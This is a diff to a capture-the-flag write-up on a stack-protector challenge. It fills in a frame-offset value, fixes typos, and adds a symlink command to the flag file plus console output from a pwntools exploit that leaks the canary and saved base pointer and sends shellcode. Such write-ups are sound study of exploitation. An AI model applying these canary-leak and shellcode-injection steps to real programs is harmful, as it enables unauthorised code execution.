@@ -11251,7 +11251,7 @@ The buffer address for the `n+1`th frame is `0x7fff591b05b0`.
 - [x] Location of the buffer: `0x7fffedf75bd0`
 - [x] Location of the canary: `0x7fffedf75c38`
 - [x] Location of stored return address to `main()`: `0x7fffedf75c48`
-- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+- [x] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function: `192`
    - [x] Location of buffer for `n` th frame: `0x7fff591b0670`
    - [x] Location of buffer for `n+1`th frame: `0x7fff591b05b0` 
 - [ ] Last 4 nibbles of the `n+1`th buffer
@@ -11297,10 +11297,14 @@ When we leak out the canary in the first stage of the payload, we also leak out 
 But, if we repeat the first stage of the payload, in the second invocation of `challenge()`, we will be able to leak out the base pointer of the first invocation. 
 
 Since, we know the distance between the buffer and the stored base pointer, we can calculate the address of the first invocation's buffer.
-From there, as we know the offset between the buffers of the `n`th and `n+1`th invocation of `challenge()`, we can calculate the buffer address of the 2nd invocation, and most importantly, calculate the buffer address of the 3rd (next) invocation in which we will pass teh shellcode to the chal;enge.
+From there, as we know the offset between the buffers of the `n`th and `n+1`th invocation of `challenge()`, we can calculate the buffer address of the 2nd invocation, and most importantly, calculate the buffer address of the 3rd (next) invocation in which we will pass the shellcode to the challenge.
 
 
 ### Exploit
+
+```
+hacker@program-security~canary-conundrum-hard:~$ ln -sf /flag ~/Z
+```
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
@@ -11416,6 +11420,18 @@ p.recvuntil(b"bytes)!")
 p.send(payload)
 
 p.interactive()
+```
+
+```
+hacker@program-security~canary-conundrum-hard:~$ python ~/script.py 
+Canary : 0xb95238ac01537f00
+Canary     : 0xb95238ac01537f00
+Stored RBP : 0x7fff5347e5d0
+Shellcode length: 10
+
+You said: jZT_X@\xb6\x04\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Goodbye!
+$  
 ```
 
 ```
